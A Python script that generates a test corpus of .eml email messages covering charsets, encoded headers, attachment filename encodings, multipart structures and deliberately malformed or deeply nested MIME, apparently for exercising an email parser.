#!/usr/bin/env python3
"""Writes the MIME corpus. Each message is typed out below; only the three
that are a matter of size (a long header, a long line, deep nesting) and the
encoded payloads are computed. Run once; the .eml files are what is kept."""
import base64, os, sys

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)
for old in os.listdir(OUT):
    if old.endswith(".eml"):
        os.remove(os.path.join(OUT, old))

def b64(data, width=76):
    if isinstance(data, str):
        data = data.encode("utf-8")
    text = base64.b64encode(data).decode("ascii")
    return "\n".join(text[i:i + width] for i in range(0, len(text), width))

def write(name, content, crlf=True):
    """content: str (encoded as UTF-8) or bytes. LF becomes CRLF unless told not to."""
    if isinstance(content, str):
        content = content.encode("utf-8")
    if crlf:
        content = content.replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
    with open(os.path.join(OUT, name + ".eml"), "wb") as f:
        f.write(content)

PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
ESC = "\x1b"
BEL = "\x07"

# ---------------------------------------------------------------- the plain ones

write("plain-ascii", """\
Return-Path: <ana.ruiz@example.com>
Received: from mail.example.com (mail.example.com [192.0.2.10])
\tby mx.example.org with ESMTPS id 4XyZ12abc
\tfor <robin@example.org>; Sat, 14 Nov 2026 09:14:03 +0000 (UTC)
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>
Cc: Sam Lee <sam.lee@example.com>, "Nair, Priya" <priya.nair@example.com>
Subject: Q4 roadmap review
Date: Sat, 14 Nov 2026 09:14:00 +0000
Message-ID: <q4-roadmap.1@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi Robin,

Here is the draft of the Q4 roadmap. Could you look it over before
Thursday's review?

Thanks,
Ana
""")

write("plain-quotes-signature-links", """\
From: Robin Vale <robin@example.org>
To: Ana Ruiz <ana.ruiz@example.com>
Subject: Re: Q4 roadmap review
Date: Sat, 14 Nov 2026 10:02:00 +0000
Message-ID: <q4-roadmap.3@example.org>
In-Reply-To: <q4-roadmap.2@example.com>
References: <q4-roadmap.1@example.com> <q4-roadmap.2@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

Looks good. Two things, both small, inline below; the full notes are at https://example.org/notes/q4-roadmap?rev=3#comments and you can reach the whole group at mailto:roadmap@example.org if that is easier.

On Sat, 14 Nov 2026 at 09:40, Ana Ruiz wrote:
> Thanks for the quick read. I have moved the launch to week 47 and kept the freeze where it was, which leaves four working days for the checks.
>
> On Sat, 14 Nov 2026 at 09:20, Robin Vale wrote:
> > Can we move the launch a week? The freeze lands on the same day as the audit.
> >
> > > Original plan: https://example.com/plans/q4 (launch in week 46).
>> Also: who owns the rollback?

Four days is tight but fine.
\tTabbed line\twith columns

-- 
Robin Vale
Example Org · https://example.org/people/robin
> not a quote, part of the signature
""")

write("quoted-printable-soft-breaks", """\
From: =?UTF-8?Q?Tom=C3=A1s_Ortega?= <tomas.ortega@example.com>
To: Robin Vale <robin@example.org>
Subject: =?UTF-8?Q?Presupuesto_de_oto=C3=B1o?=
Date: Sat, 14 Nov 2026 09:20:00 +0100
Message-ID: <qp.1@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hola Robin:

El presupuesto de oto=C3=B1o est=C3=A1 casi listo. Esta l=C3=ADnea es tan l=
arga que el programa del remitente la parti=C3=B3 con saltos suaves, y deb=
e llegar entera.

Total: 1=C2=A0250,00=C2=A0=E2=82=AC =3D lo acordado.=20
Un signo igual suelto al final de l=C3=ADnea no es un salto: =3D
Tom=C3=A1s
""")

write("quoted-printable-malformed", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Broken quoted-printable
Date: Sat, 14 Nov 2026 09:21:00 +0000
Message-ID: <qp.2@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

An escape with bad digits: =ZZ and =G1 and =1.
A lower-case one: caf=e9. An equals at the very end of the text: =
=
=A
=""")

write("base64-text", """\
From: Priya Nair <priya.nair@example.com>
To: Robin Vale <robin@example.org>
Subject: Car park
Date: Sat, 14 Nov 2026 09:22:00 +0530
Message-ID: <b64.1@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

""" + b64("Seven o'clock at the north car park.\nBring the badge – the gate is locked after six.\n", 60) + "\n")

write("base64-broken", """\
From: Priya Nair <priya.nair@example.com>
To: Robin Vale <robin@example.org>
Subject: Car park, again
Date: Sat, 14 Nov 2026 09:23:00 +0530
Message-ID: <b64.2@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

U2V2ZW4gbydjbG9jayBhdCB0
  aGUgbm9ydGgg !!! Y2FyIHBhcmsu
====
Cg
-- not base64 at all --
=
""")

# ---------------------------------------------------------------- charsets

def charset_message(name, label, codec, subject, body, who=("Ana Ruiz", "ana.ruiz@example.com"), extra=b""):
    head = (
        f"From: {who[0]} <{who[1]}>\n"
        f"To: Robin Vale <robin@example.org>\n"
        f"Subject: =?{label}?B?{base64.b64encode(subject.encode(codec)).decode()}?=\n"
        f"Date: Sat, 14 Nov 2026 09:30:00 +0000\n"
        f"Message-ID: <charset.{name}@example.com>\n"
        f"MIME-Version: 1.0\n"
        f"Content-Type: text/plain; charset={label}\n"
        f"Content-Transfer-Encoding: 8bit\n\n"
    ).encode("ascii")
    write("charset-" + name, head.replace(b"\n", b"\r\n") + body.encode(codec).replace(b"\n", b"\r\n") + extra, crlf=False)

charset_message("iso-8859-1", "ISO-8859-1", "latin-1", "Réunion à Besançon", "Bonjour Robin,\n\nLa réunion est déplacée à 15 h. Ça vous convient ? Coût : 12 £ ou ½ journée.\n\nÀ bientôt,\nAna\n")
charset_message("windows-1252", "windows-1252", "cp1252", "“Smart quotes” – and the € sign", "Robin said: “the budget is €1 250” — that’s final… ™ • ‰ Š œ\n")
charset_message("iso-2022-jp", "ISO-2022-JP", "iso2022_jp", "会議のお知らせ", "ロビンさん、\n\n会議は金曜日の午後三時に変更になりました。\nよろしくお願いします。\n\n田中\n", who=("Tanaka Yuki", "tanaka.yuki@example.com"))
charset_message("shift-jis", "Shift_JIS", "shift_jis", "見積書の件", "お世話になっております。\n見積書を添付いたします。ｶﾀｶﾅ も 表示 できますか。\n", who=("Tanaka Yuki", "tanaka.yuki@example.com"))
charset_message("gb2312", "GB2312", "gb2312", "季度报告", "罗宾：\n\n季度报告已经完成，请在星期五之前审阅。\n\n陈静\n", who=("Chen Jing", "chen.jing@example.com"))
charset_message("gbk", "GBK", "gbk", "會議紀錄与镕", "这封邮件用 GBK 编码，含有 GB2312 没有的字：镕、堃、喆。\n", who=("Chen Jing", "chen.jing@example.com"))
charset_message("big5", "Big5", "big5", "會議紀錄", "羅賓：\n\n附上星期三的會議紀錄，請查收。\n\n林怡君\n", who=("Lin Yijun", "lin.yijun@example.com"))
charset_message("euc-kr", "EUC-KR", "euc_kr", "회의 일정 변경", "로빈 님,\n\n회의가 금요일 오후 세 시로 변경되었습니다.\n\n김민준 드림\n", who=("Kim Minjun", "kim.minjun@example.com"))
charset_message("koi8-r", "KOI8-R", "koi8_r", "Отчёт за квартал", "Здравствуйте, Робин!\n\nКвартальный отчёт готов. Посмотрите, пожалуйста, до пятницы.\n\nС уважением,\nОльга\n", who=("Olga Petrova", "olga.petrova@example.com"))

write("charset-utf-16", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: =?UTF-16?B?""" + base64.b64encode("Sixteen bits ☕".encode("utf-16")).decode() + """?=
Date: Sat, 14 Nov 2026 09:31:00 +0000
Message-ID: <charset.utf-16@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-16
Content-Transfer-Encoding: base64

""" + b64("Sent from a program that writes UTF-16.\nTomás, 陈静 and 🎉 all fit.\n".encode("utf-16")) + "\n")

write("charset-unknown", (
    b"From: Sam Lee <sam.lee@example.com>\r\n"
    b"To: Robin Vale <robin@example.org>\r\n"
    b"Subject: =?x-klingon-9?Q?nuqneH_=E9=F1?= what charset is this\r\n"
    b"Date: Sat, 14 Nov 2026 09:32:00 +0000\r\n"
    b"Message-ID: <charset.unknown@example.com>\r\n"
    b"MIME-Version: 1.0\r\n"
    b"Content-Type: text/plain; charset=x-klingon-9\r\n"
    b"Content-Transfer-Encoding: 8bit\r\n\r\n"
    b"The label on this text names no charset anyone knows.\r\n"
    b"Bytes above 127: \xe9\xf1\xfc\x80\x9f\xff and the ASCII around them should survive.\r\n"
), crlf=False)

write("charset-wrong-label", (
    b"From: Sam Lee <sam.lee@example.com>\r\n"
    b"To: Robin Vale <robin@example.org>\r\n"
    b"Subject: =?UTF-8?Q?Caf=E9_r=E9union?= says UTF-8, is Latin-1\r\n"
    b"Date: Sat, 14 Nov 2026 09:33:00 +0000\r\n"
    b"Message-ID: <charset.wrong@example.com>\r\n"
    b"MIME-Version: 1.0\r\n"
    b"Content-Type: text/plain; charset=utf-8\r\n"
    b"Content-Transfer-Encoding: 8bit\r\n\r\n"
    b"Labelled UTF-8, written in Latin-1: caf\xe9, r\xe9union, \xe0 bient\xf4t.\r\n"
    b"A lone continuation byte \x80, a truncated sequence \xe2\x82, an overlong \xc0\xaf,\r\n"
    b"a surrogate \xed\xa0\x80 and a five-byte form \xf8\x88\x80\x80\x80.\r\n"
), crlf=False)

write("charset-ascii-label-utf8-bytes", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Says ASCII, is not
Date: Sat, 14 Nov 2026 09:34:00 +0000
Message-ID: <charset.ascii@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Labelled seven-bit ASCII, but: Tomás, 陈静, ☕ and 🎉.
""")

# ---------------------------------------------------------------- encoded words

write("encoded-words-adjacent", """\
From: =?UTF-8?Q?Tom=C3=A1s?= =?UTF-8?Q?_Ortega?= <tomas.ortega@example.com>
To: =?ISO-8859-1?Q?Ren=E9e?= =?UTF-8?B?IOKYlQ==?= <renee@example.org>,
 =?UTF-8?B?6ZmI6Z2Z?= <chen.jing@example.com>
Subject: =?UTF-8?Q?Tom=C3=A1s_sent?=
 =?UTF-8?Q?_you_the?= =?UTF-8?B?IOKYlSA=?=
\t=?ISO-8859-1?Q?caf=E9?= budget =?UTF-8?Q?=F0=9F=8E=89?=
Date: Sat, 14 Nov 2026 09:40:00 +0000
Message-ID: <ew.1@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Adjacent encoded words join with nothing between them; an encoded word
and plain text keep their space.
""")

jp = "日本語の件名".encode("utf-8")
write("encoded-words-split-mid-character", """\
From: Tanaka Yuki <tanaka.yuki@example.com>
To: Robin Vale <robin@example.org>
Subject: =?UTF-8?B?""" + base64.b64encode(jp[:7]).decode() + """?=
 =?UTF-8?B?""" + base64.b64encode(jp[7:]).decode() + """?=
Comments: =?UTF-8?Q?caf=C3?= =?UTF-8?Q?=A9?=
Date: Sat, 14 Nov 2026 09:41:00 +0900
Message-ID: <ew.2@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

The subject's bytes were cut between two encoded words in the middle of
a character, which the standard forbids and programs do anyway.
""")

write("encoded-words-malformed", """\
From: =?UTF-8?B?!!!not base64!!!?= <sam.lee@example.com>
To: =?UTF-8?X?no-such-encoding?= <robin@example.org>, =?UTF-8?Q?unterminated <a@example.org>
Cc: =??Q?no_charset?= <b@example.org>, =?UTF-8?Q??= <c@example.org>, =?UTF-8??= <d@example.org>
Subject: =?UTF-8?Q?bad_=ZZ_hex_=4?= =?UTF-8?B??= =?UTF-8?Q?=?UTF-8?Q?nested?=?= =?=?= =? ?= =?UTF-8?Q?a b?= ?= =?utf-8?q?lower_case_works?=
Date: Sat, 14 Nov 2026 09:42:00 +0000
Message-ID: <ew.3@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

None of that should stop the message being read.
""")

write("encoded-words-absurdly-long", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: =?UTF-8?B?""" + base64.b64encode(("Seventy-five characters is the limit, and this is not that. " * 60).encode()).decode() + """?=
X-Also-Long: =?UTF-8?Q?""" + ("=E2=98=95" * 700) + """?=
Date: Sat, 14 Nov 2026 09:43:00 +0000
Message-ID: <ew.4@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

One encoded word several kilobytes long, on one line.
""")

# ---------------------------------------------------------------- file names

write("rfc2231-filename-continuations", """\
From: Chen Jing <chen.jing@example.com>
To: Robin Vale <robin@example.org>
Subject: Quarterly report
Date: Sat, 14 Nov 2026 09:50:00 +0800
Message-ID: <rfc2231.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_cont"

--=_cont
Content-Type: text/plain; charset=utf-8

The report is attached. Its name comes in three pieces.
--=_cont
Content-Type: application/pdf;
 name*0*=UTF-8''%E5%AD%A3%E5%BA%A6;
 name*1*=%E6%8A%A5%E5%91%8A%20Q4;
 name*2=" final.pdf"
Content-Disposition: attachment;
 filename*0*=UTF-8''%E5%AD%A3%E5%BA%A6;
 filename*1*=%E6%8A%A5%E5%91%8A%20Q4;
 filename*2=" final.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJSBub3QgcmVhbGx5IGEgUERGCg==
--=_cont
Content-Type: text/plain
Content-Disposition: attachment;
 filename*0="a name long enough that the program which sent it ";
 filename*1="decided to cut it into continuations without ";
 filename*2="any encoding at all.txt"

Plain continuations.
--=_cont
Content-Type: application/octet-stream
Content-Disposition: attachment;
 filename*2="out of order";
 filename*0="pieces ";
 filename*5=" with a gap.bin"
Content-Transfer-Encoding: base64

AAECAwQ=
--=_cont--
""")

write("rfc2231-filename-charset", """\
From: =?ISO-8859-1?Q?Tom=E1s_Ortega?= <tomas.ortega@example.com>
To: Robin Vale <robin@example.org>
Subject: =?ISO-8859-1?Q?Presentaci=F3n?=
Date: Sat, 14 Nov 2026 09:51:00 +0100
Message-ID: <rfc2231.2@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_charset"

--=_charset
Content-Type: text/plain; charset=utf-8

Three files, each named a different way.
--=_charset
Content-Type: application/vnd.ms-powerpoint
Content-Disposition: attachment;
 filename*=iso-8859-1'es'Presentaci%F3n%20de%20oto%F1o.ppt
Content-Transfer-Encoding: base64

0M8R4KGxGuE=
--=_charset
Content-Type: image/png; name="=?UTF-8?B?4piVIGZvdG8ucG5n?="
Content-Disposition: attachment; filename="=?UTF-8?B?4piVIGZvdG8ucG5n?="
Content-Transfer-Encoding: base64

""" + PNG + """
--=_charset
Content-Type: text/plain; name="both.txt"
Content-Disposition: attachment; filename="fallback.txt";
 filename*=UTF-8''%E2%9C%93%20preferred.txt

When both forms are given, the encoded one is the name.
--=_charset
Content-Type: application/octet-stream
Content-Disposition: attachment;
 filename*=no-such-charset''%FF%FE%20odd.bin; filename*=UTF-8''%E0%A4%A
Content-Transfer-Encoding: base64

AAEC
--=_charset--
""")

# ---------------------------------------------------------------- multipart shapes

write("multipart-alternative", """\
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>
Subject: Offsite agenda
Date: Sat, 14 Nov 2026 10:00:00 +0000
Message-ID: <alt.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="alt-1"

This is a message in MIME format. If you can read this, your mail
program does not understand it.

--alt-1
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Offsite agenda

* Travel
* Rooms

The agenda is at https://example.com/agenda and the room list at
https://example.com/rooms. Can we move it a week?
--alt-1
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<html><body><h1>Offsite agenda</h1><ul><li>Travel</li><li>Rooms</li></ul>
<p>The <a href=3D"https://example.com/agenda">agenda</a> and the
<a href=3D"https://example.com/rooms">room list</a> are up.</p>
<blockquote>Can we move it a week?</blockquote></body></html>
--alt-1--

Text after the last boundary, which is not part of the message.
""")

write("multipart-mixed-attachments", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Invoice 2026-114 and the photos
Date: Sat, 14 Nov 2026 10:01:00 +0000
Message-ID: <mixed.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_114"

------=_Part_114
Content-Type: text/plain; charset=utf-8

Please find the invoice attached, with two photos of the delivery.
------=_Part_114
Content-Type: application/pdf; name="invoice 2026-114.pdf"
Content-Disposition: attachment; filename="invoice 2026-114.pdf"; size=29
Content-Transfer-Encoding: base64

JVBERi0xLjQKJSBub3QgcmVhbGx5IGEgUERGCg==
------=_Part_114
Content-Type: IMAGE/PNG; name=delivery-1.png
Content-Disposition: ATTACHMENT; FILENAME=delivery-1.png
Content-Transfer-Encoding: BASE64

""" + PNG + """
------=_Part_114
Content-Type: text/csv; charset=utf-8; name="line items.csv"
Content-Disposition: attachment; filename="line items.csv"
Content-Transfer-Encoding: quoted-printable

item,cost
Train,48
Caf=C3=A9,12
------=_Part_114
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline

A second piece of text after the files, which is still part of the body.
------=_Part_114--
""")

write("multipart-related-cid-images", """\
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>
Subject: The new logo
Date: Sat, 14 Nov 2026 10:02:00 +0000
Message-ID: <related.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/related; boundary="rel-1"; type="text/html"

--rel-1
Content-Type: text/html; charset=utf-8

<html><body>
<p>Here is the new logo: <img src="cid:logo@example.com" alt="Example Works logo" width="120"></p>
<p>And the chart, twice: <img src="CID:chart%2Bq4@example.com" alt="Q4 chart"> <img src="cid:chart+q4@example.com"></p>
<p>One that is not in the message: <img src="cid:missing@example.com" alt="Missing"></p>
<table background="cid:logo@example.com"><tr><td style="background-image: url('cid:logo@example.com')">Framed</td></tr></table>
</body></html>
--rel-1
Content-Type: image/png; name="logo.png"
Content-ID: <logo@example.com>
Content-Disposition: inline; filename="logo.png"
Content-Transfer-Encoding: base64

""" + PNG + """
--rel-1
Content-Type: image/png
Content-ID: <chart+q4@example.com>
Content-Transfer-Encoding: base64

""" + PNG + """
--rel-1--
""")

write("multipart-nested-five-deep", """\
From: Priya Nair <priya.nair@example.com>
To: Robin Vale <robin@example.org>
Subject: Fwd: Fwd: Re: Fwd: the contract
Date: Sat, 14 Nov 2026 10:03:00 +0530
Message-ID: <nested.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="level-1"

--level-1
Content-Type: multipart/related; boundary="level-2"

--level-2
Content-Type: multipart/alternative; boundary="level-3"

--level-3
Content-Type: text/plain; charset=utf-8

The text at the bottom of five levels.
--level-3
Content-Type: multipart/related; boundary="level-4"

--level-4
Content-Type: multipart/mixed; boundary="level-5"

--level-5
Content-Type: text/html; charset=utf-8

<p>The <b>HTML</b> at the bottom of five levels. <img src="cid:deep@example.com" alt="Deep"></p>
--level-5
Content-Type: text/plain; name="note.txt"
Content-Disposition: attachment; filename="note.txt"

A file five levels down.
--level-5--
--level-4
Content-Type: image/png
Content-ID: <deep@example.com>
Content-Transfer-Encoding: base64

""" + PNG + """
--level-4--
--level-3--
--level-2--
--level-1
Content-Type: application/pdf; name="contract.pdf"
Content-Disposition: attachment; filename="contract.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQK
--level-1--
""")

deep = ["From: Sam Lee <sam.lee@example.com>", "To: Robin Vale <robin@example.org>",
        "Subject: A hundred levels", "Date: Sat, 14 Nov 2026 10:04:00 +0000",
        "Message-ID: <nested.100@example.com>", "MIME-Version: 1.0"]
for level in range(100):
    deep += [f'Content-Type: multipart/mixed; boundary="b{level}"', "", f"--b{level}"]
deep += ["Content-Type: text/plain", "", "The text inside a hundred multiparts.", ""]
for level in reversed(range(100)):
    deep += [f"--b{level}--"]
write("multipart-nested-hundred-deep", "\n".join(deep) + "\n")

write("multipart-digest", """\
From: Roadmap list <roadmap-request@example.org>
To: roadmap@example.org
Subject: Roadmap Digest, Vol 12, Issue 3
Date: Sat, 14 Nov 2026 10:05:00 +0000
Message-ID: <digest.1@example.org>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="digest-outer"

--digest-outer
Content-Type: text/plain; charset=utf-8

Today's topics:

   1. Launch week (Ana Ruiz)
   2. Re: Launch week (Sam Lee)
--digest-outer
Content-Type: multipart/digest; boundary="digest-inner"

--digest-inner

From: Ana Ruiz <ana.ruiz@example.com>
Subject: Launch week
Date: Fri, 13 Nov 2026 16:00:00 +0000
Message-ID: <launch.1@example.com>

Week 47, then.
--digest-inner
Content-Type: message/rfc822

From: Sam Lee <sam.lee@example.com>
Subject: Re: Launch week
Date: Fri, 13 Nov 2026 16:30:00 +0000
Message-ID: <launch.2@example.com>
In-Reply-To: <launch.1@example.com>
Content-Type: text/plain; charset=utf-8

> Week 47, then.

Agreed.
--digest-inner--
--digest-outer
Content-Type: text/plain; charset=utf-8

End of Roadmap Digest, Vol 12, Issue 3
--digest-outer--
""")

write("multipart-signed-detached", """\
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>
Subject: Signed: the contract terms
Date: Sat, 14 Nov 2026 10:06:00 +0000
Message-ID: <signed.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pkcs7-signature";
 micalg=sha-256; boundary="signed-1"

This is a cryptographically signed message in MIME format.

--signed-1
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

The terms are as we discussed: thirty days, renewable.

Ana
--signed-1
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7s"
Content-Description: S/MIME Cryptographic Signature

MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG9w0BBwEAAKCA
MIIDnotARealSignatureJustBytesThatLookLikeOneAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--signed-1--
""")

write("multipart-report-dsn", """\
From: Mail Delivery System <mailer-daemon@example.org>
To: robin@example.org
Subject: Undelivered Mail Returned to Sender
Date: Sat, 14 Nov 2026 10:07:00 +0000
Message-ID: <dsn.1@example.org>
Auto-Submitted: auto-replied
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
 boundary="dsn-1"

This is a MIME-encapsulated message.

--dsn-1
Content-Description: Notification
Content-Type: text/plain; charset=us-ascii

This is the mail system at host mx.example.org.

I'm sorry to have to inform you that your message could not
be delivered to one or more recipients.

<nobody@example.net>: host mx.example.net[192.0.2.25] said: 550 5.1.1
    <nobody@example.net>: Recipient address rejected: User unknown
--dsn-1
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; mx.example.org
X-Postfix-Queue-ID: 4XyZ99zzz
Arrival-Date: Sat, 14 Nov 2026 10:06:55 +0000 (UTC)

Final-Recipient: rfc822; nobody@example.net
Original-Recipient: rfc822;nobody@example.net
Action: failed
Status: 5.1.1
Remote-MTA: dns; mx.example.net
Diagnostic-Code: smtp; 550 5.1.1 <nobody@example.net>: Recipient address
    rejected: User unknown
--dsn-1
Content-Description: Undelivered Message Headers
Content-Type: text/rfc822-headers

Return-Path: <robin@example.org>
From: Robin Vale <robin@example.org>
To: nobody@example.net
Subject: Are you there?
Date: Sat, 14 Nov 2026 10:06:50 +0000
Message-ID: <are-you-there.1@example.org>
--dsn-1--
""")

ICS = """BEGIN:VCALENDAR
PRODID:-//Example Works//Calendar 1.0//EN
VERSION:2.0
METHOD:REQUEST
BEGIN:VEVENT
UID:offsite-2026@example.com
DTSTAMP:20261114T100800Z
DTSTART;TZID=Europe/Madrid:20261203T093000
DTEND;TZID=Europe/Madrid:20261203T170000
SUMMARY:Offsite: Q4 planning
LOCATION:Riverside room\\, Example Works
ORGANIZER;CN=Ana Ruiz:mailto:ana.ruiz@example.com
ATTENDEE;CN=Robin Vale;RSVP=TRUE;PARTSTAT=NEEDS-ACTION:mailto:robin@exampl
 e.org
ATTENDEE;CN=Sam Lee;RSVP=TRUE:mailto:sam.lee@example.com
DESCRIPTION:Agenda at https://example.com/agenda\\nBring a laptop.
SEQUENCE:0
STATUS:CONFIRMED
END:VEVENT
END:VCALENDAR
"""
write("calendar-invite", """\
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>, Sam Lee <sam.lee@example.com>
Subject: Invitation: Offsite: Q4 planning @ Thu 3 Dec 2026 09:30
Date: Sat, 14 Nov 2026 10:08:00 +0000
Message-ID: <invite.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="cal-outer"

--cal-outer
Content-Type: multipart/alternative; boundary="cal-inner"

--cal-inner
Content-Type: text/plain; charset=utf-8

You are invited to: Offsite: Q4 planning
When: Thursday 3 December 2026, 09:30 to 17:00 (Europe/Madrid)
Where: Riverside room, Example Works
--cal-inner
Content-Type: text/html; charset=utf-8

<p>You are invited to <b>Offsite: Q4 planning</b>.</p>
<p>When: Thursday 3 December 2026, 09:30 to 17:00<br>Where: Riverside room</p>
--cal-inner
Content-Type: text/calendar; charset=utf-8; method=REQUEST

""" + ICS + """--cal-inner--
--cal-outer
Content-Type: application/ics; name="invite.ics"
Content-Disposition: attachment; filename="invite.ics"
Content-Transfer-Encoding: base64

""" + b64(ICS.replace("\n", "\r\n")) + """
--cal-outer--
""")

write("message-rfc822-attachment", """\
From: Priya Nair <priya.nair@example.com>
To: Robin Vale <robin@example.org>
Subject: Fwd: Contract
Date: Sat, 14 Nov 2026 10:09:00 +0530
Message-ID: <fwd.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="fwd-1"

--fwd-1
Content-Type: text/plain; charset=utf-8

See the attached message. The file inside it belongs to it, not to this one.
--fwd-1
Content-Type: message/rfc822; name="Contract.eml"
Content-Disposition: attachment; filename="Contract.eml"

From: Omar Haddad <omar.haddad@example.com>
To: Priya Nair <priya.nair@example.com>
Subject: Contract
Date: Fri, 13 Nov 2026 18:00:00 +0200
Message-ID: <contract.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="inner-1"

--inner-1
Content-Type: text/plain; charset=utf-8

The inner message, with a file of its own.
--inner-1
Content-Type: application/pdf; name="contract.pdf"
Content-Disposition: attachment; filename="contract.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQK
--inner-1--
--fwd-1--
""")

# ---------------------------------------------------------------- broken structure

write("missing-final-boundary", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Cut off
Date: Sat, 14 Nov 2026 10:10:00 +0000
Message-ID: <cut.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="never-closed"

--never-closed
Content-Type: text/plain; charset=utf-8

The part that arrived.
--never-closed
Content-Type: application/pdf; name="half.pdf"
Content-Disposition: attachment; filename="half.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJSBub3QgcmVhbGx5IGEg""")

write("boundary-in-content", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: About boundaries
Date: Sat, 14 Nov 2026 10:11:00 +0000
Message-ID: <frontier.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="frontier"

--frontier
Content-Type: text/plain; charset=utf-8

A boundary only counts at the start of a line. This --frontier is in the
middle of one, and so is this: x--frontier--
 --frontier (after a space)
--frontierX is a longer word that starts the same way.
--frontie is a shorter one.
-- frontier has a space in it.
The text carries on after all of them.
--frontier
Content-Type: text/plain; name="notes.txt"
Content-Disposition: attachment; filename="notes.txt"

--frontier-- would end the message if it were not... it is. Hm.
--frontier--
""")

write("no-boundary-parameter", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Multipart without a boundary
Date: Sat, 14 Nov 2026 10:12:00 +0000
Message-ID: <nob.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed

--guess-me
Content-Type: text/plain; charset=utf-8

The header never said what separates the parts.
--guess-me
Content-Type: text/html

<p>Second part.</p>
--guess-me--
""")

write("boundary-oddities", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Odd boundaries
Date: Sat, 14 Nov 2026 10:13:00 +0000
Message-ID: <oddb.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=""; boundary="second one wins?";
 boundary*0="or "; boundary*1="this"

--
Content-Type: text/plain

After an empty boundary.
--second one wins?
Content-Type: text/plain

After the second.
--or this
Content-Type: multipart/alternative; boundary="
Content-Type: multipart/alternative; boundary=--
Content-Type: multipart/alternative; boundary="a boundary that is far longer than the seventy characters the standard allows for one of these things, to see what happens"

--a boundary that is far longer than the seventy characters the standard allows for one of these things, to see what happens
Content-Type: text/plain

Inside the long one.
----
--
----
""")

write("empty-parts", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Empty parts
Date: Sat, 14 Nov 2026 10:14:00 +0000
Message-ID: <empty.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="e"

--e
--e

--e
Content-Type: text/plain

--e
Content-Type: text/html

--e
Content-Type: application/octet-stream; name="empty.bin"
Content-Disposition: attachment; filename="empty.bin"
Content-Transfer-Encoding: base64

--e
